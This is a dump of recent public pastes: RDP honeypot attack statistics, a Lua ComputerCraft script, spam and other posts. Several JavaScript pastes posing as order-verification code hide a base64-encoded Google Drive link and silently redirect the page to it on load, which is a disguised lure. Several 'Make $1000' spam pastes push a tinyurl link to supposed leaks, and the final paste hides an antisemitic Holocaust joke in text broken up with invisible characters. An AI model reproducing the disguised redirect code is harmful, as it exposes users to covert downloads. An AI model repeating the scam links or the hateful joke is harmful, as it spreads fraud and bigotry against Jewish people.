id,title,username,language,date,content
hxBTcFTk,2025-04-03_stats.json,rdp_snitch,JSON,Friday 4th of April 2025 07:18:40 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 35271,
    ""147.182.229.114"": 858,
    ""138.199.24.6"": 64821,
    ""138.199.24.30"": 8760,
    ""156.146.57.52"": 8826,
    ""150.95.89.149"": 8712,
    ""156.146.57.174"": 8817,
    ""146.190.105.191"": 1263,
    ""106.14.144.233"": 426,
    ""102.129.145.197"": 9174,
    ""147.185.132.19"": 9,
    ""185.147.124.165"": 9,
    ""68.183.178.139"": 6,
    ""205.210.31.206"": 9,
    ""80.94.95.90"": 6,
    ""93.174.95.106"": 3,
    ""157.245.104.150"": 3,
    ""88.214.25.123"": 6,
    ""92.255.85.92"": 9,
    ""194.165.16.164"": 6,
    ""1.95.183.16"": 3,
    ""58.218.199.219"": 12,
    ""147.185.132.40"": 9,
    ""165.154.138.85"": 3,
    ""45.79.73.129"": 12,
    ""170.187.203.104"": 3,
    ""198.235.24.108"": 9,
    ""84.17.46.178"": 12
  },
  ""asn"": {
    ""AS212238"": 52914,
    ""AS14061"": 2130,
    ""AS60068"": 73593,
    ""AS135161"": 8712,
    ""AS37963"": 426,
    ""AS174"": 9174,
    ""AS396982"": 36,
    ""AS49505"": 9,
    ""AS204428"": 6,
    ""AS202425"": 3,
    ""AS35042"": 6,
    ""AS207566"": 9,
    ""AS48721"": 6,
    ""AS55990"": 3,
    ""AS4134"": 12,
    ""AS135377"": 3,
    ""AS63949"": 15
  },
  ""isp"": {
    ""Datacamp Limited"": 52914,
    ""DigitalOcean, LLC"": 2130,
    ""DataCamp Limited"": 73593,
    ""GMO-Z.COM PTE. LTD."": 8712,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""Cogent Communications"": 9174,
    ""Google LLC"": 36,
    ""JSC Selectel"": 9,
    ""SS-Net"": 6,
    ""IP Volume inc"": 3,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Chang Way Technologies Co. Limited"": 9,
    ""Flyservers S.A."": 6,
    ""DXTNET"": 3,
    ""Chinanet"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Akamai Technologies, Inc."": 15
  },
  ""org"": {
    ""Datacamp Limited"": 52914,
    ""DigitalOcean, LLC"": 2130,
    ""Cdn77 SGP"": 73581,
    ""Zcom Thai"": 8712,
    ""Aliyun Computing Co., LTD"": 426,
    ""Netutils"": 9174,
    ""Palo Alto Networks, Inc"": 36,
    ""Almira LLC"": 9,
    ""Unmanaged LTD"": 6,
    ""IP Volume inc"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Chang Way Technologies Co. Limited"": 9,
    ""Flyservers S.A"": 6,
    ""Beijing Teletron Telecom Engineering Co., Ltd."": 3,
    ""Chinanet JS"": 12,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Linode"": 15,
    ""Cdn77 AMS"": 12
  },
  ""regionName"": {
    ""North West"": 126495,
    ""California"": 10080,
    ""Tokyo"": 8712,
    ""South West"": 1269,
    ""Shanghai"": 426,
    ""Moscow"": 18,
    ""Sofia-Capital"": 6,
    ""North Holland"": 15,
    ""Karnataka"": 3,
    ""Kowloon City"": 6,
    ""Kaunas"": 6,
    ""Guizhou"": 3,
    ""Jiangsu"": 12,
    ""Hesse"": 3,
    ""Georgia"": 3
  },
  ""country"": {
    ""Singapore"": 127764,
    ""United States"": 10083,
    ""Japan"": 8712,
    ""China"": 441,
    ""Russia"": 18,
    ""Bulgaria"": 6,
    ""The Netherlands"": 15,
    ""India"": 3,
    ""Hong Kong"": 6,
    ""Lithuania"": 6,
    ""Germany"": 3
  },
  ""account"": {
    ""hello"": 146964,
    ""zIUSdWivX"": 3,
    ""sfLjSJ"": 3,
    ""fZMizU"": 3,
    ""Domain"": 15,
    ""BDqFzlpWt"": 3,
    ""ScfRZI"": 3,
    ""khSizK"": 3,
    ""Administr"": 6,
    ""root"": 3,
    ""Test"": 15,
    ""lRmxRXldY"": 3,
    ""lWCxlE"": 3,
    ""SEuFSn"": 3,
    ""Administrator"": 3,
    ""ojqfilu4"": 12,
    ""beio"": 3,
    ""DUYvqdheA"": 3,
    ""nSlXHr"": 3,
    ""VYxYuJ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 147057
  },
  ""client_build"": {
    ""Unknown"": 147057
  },
  ""client_name"": {
    ""Unknown"": 147057
  },
  ""ip_type"": {
    ""hosting & proxy"": 129057,
    ""hosting"": 8784,
    ""proxy"": 9198,
    ""Unknown"": 18
  }
}"
i01ZPrFt,2025-04-03_stats.json,rdp_snitch,JSON,Friday 4th of April 2025 07:16:24 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 35270,
    ""147.182.229.114"": 858,
    ""138.199.24.6"": 64821,
    ""138.199.24.30"": 8760,
    ""156.146.57.52"": 8826,
    ""150.95.89.149"": 8712,
    ""156.146.57.174"": 8817,
    ""146.190.105.191"": 1263,
    ""106.14.144.233"": 426,
    ""102.129.145.197"": 9174,
    ""147.185.132.19"": 9,
    ""185.147.124.165"": 9,
    ""68.183.178.139"": 6,
    ""205.210.31.206"": 9,
    ""80.94.95.90"": 6,
    ""93.174.95.106"": 3,
    ""157.245.104.150"": 3,
    ""88.214.25.123"": 6,
    ""92.255.85.92"": 9,
    ""194.165.16.164"": 6,
    ""1.95.183.16"": 3,
    ""58.218.199.219"": 12,
    ""147.185.132.40"": 9,
    ""165.154.138.85"": 3,
    ""45.79.73.129"": 12,
    ""170.187.203.104"": 3,
    ""198.235.24.108"": 9,
    ""84.17.46.178"": 12
  },
  ""asn"": {
    ""AS212238"": 52913,
    ""AS14061"": 2130,
    ""AS60068"": 73593,
    ""AS135161"": 8712,
    ""AS37963"": 426,
    ""AS174"": 9174,
    ""AS396982"": 36,
    ""AS49505"": 9,
    ""AS204428"": 6,
    ""AS202425"": 3,
    ""AS35042"": 6,
    ""AS207566"": 9,
    ""AS48721"": 6,
    ""AS55990"": 3,
    ""AS4134"": 12,
    ""AS135377"": 3,
    ""AS63949"": 15
  },
  ""isp"": {
    ""Datacamp Limited"": 52913,
    ""DigitalOcean, LLC"": 2130,
    ""DataCamp Limited"": 73593,
    ""GMO-Z.COM PTE. LTD."": 8712,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""Cogent Communications"": 9174,
    ""Google LLC"": 36,
    ""JSC Selectel"": 9,
    ""SS-Net"": 6,
    ""IP Volume inc"": 3,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Chang Way Technologies Co. Limited"": 9,
    ""Flyservers S.A."": 6,
    ""DXTNET"": 3,
    ""Chinanet"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Akamai Technologies, Inc."": 15
  },
  ""org"": {
    ""Datacamp Limited"": 52913,
    ""DigitalOcean, LLC"": 2130,
    ""Cdn77 SGP"": 73581,
    ""Zcom Thai"": 8712,
    ""Aliyun Computing Co., LTD"": 426,
    ""Netutils"": 9174,
    ""Palo Alto Networks, Inc"": 36,
    ""Almira LLC"": 9,
    ""Unmanaged LTD"": 6,
    ""IP Volume inc"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Chang Way Technologies Co. Limited"": 9,
    ""Flyservers S.A"": 6,
    ""Beijing Teletron Telecom Engineering Co., Ltd."": 3,
    ""Chinanet JS"": 12,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Linode"": 15,
    ""Cdn77 AMS"": 12
  },
  ""regionName"": {
    ""North West"": 126494,
    ""California"": 10080,
    ""Tokyo"": 8712,
    ""South West"": 1269,
    ""Shanghai"": 426,
    ""Moscow"": 18,
    ""Sofia-Capital"": 6,
    ""North Holland"": 15,
    ""Karnataka"": 3,
    ""Kowloon City"": 6,
    ""Kaunas"": 6,
    ""Guizhou"": 3,
    ""Jiangsu"": 12,
    ""Hesse"": 3,
    ""Georgia"": 3
  },
  ""country"": {
    ""Singapore"": 127763,
    ""United States"": 10083,
    ""Japan"": 8712,
    ""China"": 441,
    ""Russia"": 18,
    ""Bulgaria"": 6,
    ""The Netherlands"": 15,
    ""India"": 3,
    ""Hong Kong"": 6,
    ""Lithuania"": 6,
    ""Germany"": 3
  },
  ""account"": {
    ""hello"": 146963,
    ""zIUSdWivX"": 3,
    ""sfLjSJ"": 3,
    ""fZMizU"": 3,
    ""Domain"": 15,
    ""BDqFzlpWt"": 3,
    ""ScfRZI"": 3,
    ""khSizK"": 3,
    ""Administr"": 6,
    ""root"": 3,
    ""Test"": 15,
    ""lRmxRXldY"": 3,
    ""lWCxlE"": 3,
    ""SEuFSn"": 3,
    ""Administrator"": 3,
    ""ojqfilu4"": 12,
    ""beio"": 3,
    ""DUYvqdheA"": 3,
    ""nSlXHr"": 3,
    ""VYxYuJ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 147056
  },
  ""client_build"": {
    ""Unknown"": 147056
  },
  ""client_name"": {
    ""Unknown"": 147056
  },
  ""ip_type"": {
    ""hosting & proxy"": 129056,
    ""hosting"": 8784,
    ""proxy"": 9198,
    ""Unknown"": 18
  }
}"
nzVYnLz5,Products.js,dentira,JavaScript,Friday 4th of April 2025 07:15:58 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55872/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gp5XAY6z,2025-04-03_stats.json,rdp_snitch,JSON,Friday 4th of April 2025 07:15:15 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 35269,
    ""147.182.229.114"": 858,
    ""138.199.24.6"": 64821,
    ""138.199.24.30"": 8760,
    ""156.146.57.52"": 8826,
    ""150.95.89.149"": 8712,
    ""156.146.57.174"": 8817,
    ""146.190.105.191"": 1263,
    ""106.14.144.233"": 426,
    ""102.129.145.197"": 9174,
    ""147.185.132.19"": 9,
    ""185.147.124.165"": 9,
    ""68.183.178.139"": 6,
    ""205.210.31.206"": 9,
    ""80.94.95.90"": 6,
    ""93.174.95.106"": 3,
    ""157.245.104.150"": 3,
    ""88.214.25.123"": 6,
    ""92.255.85.92"": 9,
    ""194.165.16.164"": 6,
    ""1.95.183.16"": 3,
    ""58.218.199.219"": 12,
    ""147.185.132.40"": 9,
    ""165.154.138.85"": 3,
    ""45.79.73.129"": 12,
    ""170.187.203.104"": 3,
    ""198.235.24.108"": 9,
    ""84.17.46.178"": 12
  },
  ""asn"": {
    ""AS212238"": 52912,
    ""AS14061"": 2130,
    ""AS60068"": 73593,
    ""AS135161"": 8712,
    ""AS37963"": 426,
    ""AS174"": 9174,
    ""AS396982"": 36,
    ""AS49505"": 9,
    ""AS204428"": 6,
    ""AS202425"": 3,
    ""AS35042"": 6,
    ""AS207566"": 9,
    ""AS48721"": 6,
    ""AS55990"": 3,
    ""AS4134"": 12,
    ""AS135377"": 3,
    ""AS63949"": 15
  },
  ""isp"": {
    ""Datacamp Limited"": 52912,
    ""DigitalOcean, LLC"": 2130,
    ""DataCamp Limited"": 73593,
    ""GMO-Z.COM PTE. LTD."": 8712,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""Cogent Communications"": 9174,
    ""Google LLC"": 36,
    ""JSC Selectel"": 9,
    ""SS-Net"": 6,
    ""IP Volume inc"": 3,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Chang Way Technologies Co. Limited"": 9,
    ""Flyservers S.A."": 6,
    ""DXTNET"": 3,
    ""Chinanet"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Akamai Technologies, Inc."": 15
  },
  ""org"": {
    ""Datacamp Limited"": 52912,
    ""DigitalOcean, LLC"": 2130,
    ""Cdn77 SGP"": 73581,
    ""Zcom Thai"": 8712,
    ""Aliyun Computing Co., LTD"": 426,
    ""Netutils"": 9174,
    ""Palo Alto Networks, Inc"": 36,
    ""Almira LLC"": 9,
    ""Unmanaged LTD"": 6,
    ""IP Volume inc"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Chang Way Technologies Co. Limited"": 9,
    ""Flyservers S.A"": 6,
    ""Beijing Teletron Telecom Engineering Co., Ltd."": 3,
    ""Chinanet JS"": 12,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Linode"": 15,
    ""Cdn77 AMS"": 12
  },
  ""regionName"": {
    ""North West"": 126493,
    ""California"": 10080,
    ""Tokyo"": 8712,
    ""South West"": 1269,
    ""Shanghai"": 426,
    ""Moscow"": 18,
    ""Sofia-Capital"": 6,
    ""North Holland"": 15,
    ""Karnataka"": 3,
    ""Kowloon City"": 6,
    ""Kaunas"": 6,
    ""Guizhou"": 3,
    ""Jiangsu"": 12,
    ""Hesse"": 3,
    ""Georgia"": 3
  },
  ""country"": {
    ""Singapore"": 127762,
    ""United States"": 10083,
    ""Japan"": 8712,
    ""China"": 441,
    ""Russia"": 18,
    ""Bulgaria"": 6,
    ""The Netherlands"": 15,
    ""India"": 3,
    ""Hong Kong"": 6,
    ""Lithuania"": 6,
    ""Germany"": 3
  },
  ""account"": {
    ""hello"": 146962,
    ""zIUSdWivX"": 3,
    ""sfLjSJ"": 3,
    ""fZMizU"": 3,
    ""Domain"": 15,
    ""BDqFzlpWt"": 3,
    ""ScfRZI"": 3,
    ""khSizK"": 3,
    ""Administr"": 6,
    ""root"": 3,
    ""Test"": 15,
    ""lRmxRXldY"": 3,
    ""lWCxlE"": 3,
    ""SEuFSn"": 3,
    ""Administrator"": 3,
    ""ojqfilu4"": 12,
    ""beio"": 3,
    ""DUYvqdheA"": 3,
    ""nSlXHr"": 3,
    ""VYxYuJ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 147055
  },
  ""client_build"": {
    ""Unknown"": 147055
  },
  ""client_name"": {
    ""Unknown"": 147055
  },
  ""ip_type"": {
    ""hosting & proxy"": 129055,
    ""hosting"": 8784,
    ""proxy"": 9198,
    ""Unknown"": 18
  }
}"
EPGEWq7y,Make $1000 15-MINUTES (BEGINNER) RV,lmoakdawadawd,JavaScript,Friday 4th of April 2025 07:06:04 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


ENMNXrZiUQ
"
4bCskTFf,Order.js,dentira,JavaScript,Friday 4th of April 2025 07:00:27 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72816/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wD1WiFnT,turret computer,Incomprehensible,Lua,Friday 4th of April 2025 06:52:46 PM CDT,"local monitor = peripheral.find(""monitor"")
local modem = peripheral.find(""modem"", rednet.open) -- doing it like this finds all modem peripherals and then opens rednet on them
local tPos
local pos
--- MAIN
monitor.clear()
monitor.setCursorPos(1,1)
monitor.setTextScale(0.5)
monitor.write(""Hello, ID: "" .. os.computerID()) --the id of the computer

function vec3ToString(vec3)
	local str = (""(x:"" .. math.floor(vec3.x+0.5) .. "", y:"" .. math.floor(vec3.y+0.5) .. "", z:"" .. math.floor(vec3.z+0.5) .. "")"")
	return str
end

function receivePosMessage()
	local id, message = rednet.receive(nil,0.5)
	if (message == nil) then return end
	tPos = message

end

function update()
	pos = ship.getWorldspacePosition()
	receivePosMessage()
	if(tPos == nil or pos == nil) then
		return
	end
	monitor.clear()
	monitor.setCursorPos(1,1)
	monitor.write(""Message from control: "" .. vec3ToString(tPos))
	monitor.setCursorPos(1,2)
	monitor.write(""Our position: "" .. vec3ToString(pos))
	print(pos)
end

while true do
	sleep(0.5)
	update()
end"
wAifubrU,EARN $900 INSTANTLY 2025 D0,lmoakdawadawd,JavaScript,Friday 4th of April 2025 06:50:07 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


KFq0gkXaP4
"
bBdeck2R,Market.js,dentira,JavaScript,Friday 4th of April 2025 06:45:05 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08966/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
s182tCKD,Make $1000 15-MINUTES (BEGINNER) RQ,lmoakdawadawd,JavaScript,Friday 4th of April 2025 06:34:11 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


dtVTn5iN3g
"
CvRKqz5B,Untitled,dentira,JavaScript,Friday 4th of April 2025 06:29:43 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56671/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GdRKuzqP,Products.js,dentira,JavaScript,Friday 4th of April 2025 06:14:20 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84753/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
z0aJyFJF,Order.js,dentira,JavaScript,Friday 4th of April 2025 05:58:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76284/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Q1rnWYNy,Market.js,dentira,JavaScript,Friday 4th of April 2025 05:43:30 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21176/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Dn13uxmK,News April4 25,Newscaster_Ned,Email,Friday 4th of April 2025 05:32:45 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

✡✡👃🏻✡✡ ‎O‎y‎ ‎v‎e‎y‎!‎ ‎I‎'‎m‎ ‎s‎o‎ ‎💵✡‎J‎e‎w‎i‎s‎h‎✡💵‎ ‎a‎n‎d‎ ‎I‎t‎'‎s‎ ‎j‎u‎s‎t‎ ‎s‎o‎ ‎c‎o‎l‎d‎ ‎I‎ ‎w‎i‎s‎h‎ ‎I‎ ‎c‎o‎u‎l‎d‎ ‎b‎e‎ ‎i‎n‎ ‎a‎n‎ ‎o‎v‎e‎n‎!‎ ‎✡✡👃🏻✡✡

C‎o‎l‎u‎m‎n‎i‎s‎t‎ ‎Q‎u‎i‎t‎s‎ ‎'‎W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎ ‎P‎o‎s‎t‎'‎ ‎O‎v‎e‎r‎ ‎J‎e‎f‎f‎ ‎B‎e‎z‎o‎s‎'‎ ‎'‎S‎i‎g‎n‎i‎f‎i‎c‎a‎n‎t‎ ‎S‎h‎i‎f‎t‎'‎
L‎o‎o‎m‎e‎r‎ ‎C‎o‎n‎f‎i‎r‎m‎s‎ ‎N‎S‎A‎ ‎D‎i‎r‎e‎c‎t‎o‎r‎/‎C‎y‎b‎e‎r‎ ‎C‎o‎m‎m‎a‎n‎d‎ ‎C‎o‎m‎m‎a‎n‎d‎e‎r‎ ‎'‎W‎a‎s‎ ‎R‎e‎f‎e‎r‎r‎e‎d‎ ‎f‎o‎r‎ ‎F‎i‎r‎i‎
I‎C‎E‎ ‎O‎f‎f‎i‎c‎e‎r‎s‎ ‎D‎e‎p‎o‎r‎t‎ ‎1‎7‎4‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎A‎l‎i‎e‎n‎s‎ ‎w‎i‎t‎h‎ ‎6‎1‎0‎ ‎C‎o‎n‎v‎i‎c‎t‎i‎o‎n‎s‎ ‎i‎n‎ ‎T‎w‎o‎ ‎W‎e‎e‎k‎s‎
C‎a‎t‎h‎o‎l‎i‎c‎ ‎P‎r‎o‎-‎L‎i‎f‎e‎ ‎A‎c‎t‎i‎v‎i‎s‎t‎ ‎A‎t‎t‎a‎c‎k‎e‎d‎ ‎D‎u‎r‎i‎n‎g‎ ‎S‎t‎r‎e‎e‎t‎ ‎V‎i‎d‎e‎o‎ ‎I‎n‎t‎e‎r‎v‎i‎e‎w‎ ‎i‎n‎ ‎N‎Y‎C‎
J‎i‎m‎ ‎J‎o‎r‎d‎a‎n‎ ‎I‎n‎v‎e‎s‎t‎i‎g‎a‎t‎i‎n‎g‎ ‎W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎ ‎S‎t‎a‎t‎e‎'‎s‎ ‎D‎a‎n‎g‎e‎r‎o‎u‎s‎ ‎S‎a‎n‎c‎t‎u‎a‎r‎y‎ ‎P‎o‎l‎i‎c‎i‎e‎s‎
'‎H‎a‎n‎d‎s‎ ‎O‎f‎f‎'‎ ‎R‎a‎l‎l‎i‎e‎s‎ ‎t‎o‎ ‎B‎e‎ ‎H‎e‎l‎d‎ ‎S‎a‎t‎u‎r‎d‎a‎y‎ ‎t‎o‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎,‎ ‎E‎l‎o‎n‎ ‎M‎u‎s‎k‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎L‎a‎w‎m‎a‎k‎e‎r‎s‎ ‎i‎n‎ ‎G‎e‎o‎r‎g‎i‎a‎ ‎S‎t‎a‎g‎e‎ ‎W‎a‎l‎k‎o‎u‎t‎ ‎t‎o‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎B‎i‎l‎l‎
D‎o‎E‎ ‎C‎r‎e‎a‎t‎e‎s‎ ‎T‎e‎a‎m‎ ‎t‎o‎ ‎H‎a‎n‎d‎l‎e‎ ‎‘‎S‎t‎a‎g‎g‎e‎r‎i‎n‎g‎ ‎V‎o‎l‎u‎m‎e‎’‎ ‎o‎f‎ ‎T‎i‎t‎l‎e‎ ‎I‎X‎ ‎C‎o‎m‎p‎l‎a‎i‎n‎t‎s‎
R‎u‎b‎i‎o‎:‎ ‎F‎o‎r‎e‎i‎g‎n‎e‎r‎s‎ ‎H‎a‎v‎e‎ ‎'‎N‎o‎t‎h‎i‎n‎g‎ ‎t‎o‎ ‎W‎o‎r‎r‎y‎ ‎A‎b‎o‎u‎t‎'‎ ‎i‎f‎ ‎T‎h‎e‎y‎ ‎D‎o‎n‎'‎t‎ ‎S‎u‎p‎p‎o‎r‎t‎ ‎H‎a‎m‎a‎s‎
